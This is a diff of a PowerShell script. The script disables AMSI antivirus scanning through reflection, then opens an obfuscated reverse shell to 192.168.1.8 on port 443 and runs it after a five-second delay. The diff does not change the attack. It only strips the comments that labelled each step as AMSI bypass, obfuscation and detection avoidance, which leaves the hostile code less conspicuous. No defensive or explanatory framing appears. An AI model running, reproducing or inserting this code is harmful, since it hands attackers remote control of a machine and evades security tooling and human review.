@@ -1,11 +1,10 @@
-# STEP 1: Bypass AMSI first
+
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
-# STEP 2: Use obfuscated reverse shell over common port
 function Execute-ReverseShell {
     $s = ("System.Net.Sockets.TCPClient").Replace('System.','')
     $h = "192.168.1.8"
-    $p = 443  # HTTPS port - less suspicious
+    $p = 443  
     
     $c = New-Object $s($h,$p)
     $st = $c.GetStream()
@@ -22,6 +21,5 @@ function Execute-ReverseShell {
     $c.Close()
 }
 
-# STEP 3: Execute with delay to avoid immediate detection
 Start-Sleep -Seconds 5
 Execute-ReverseShell
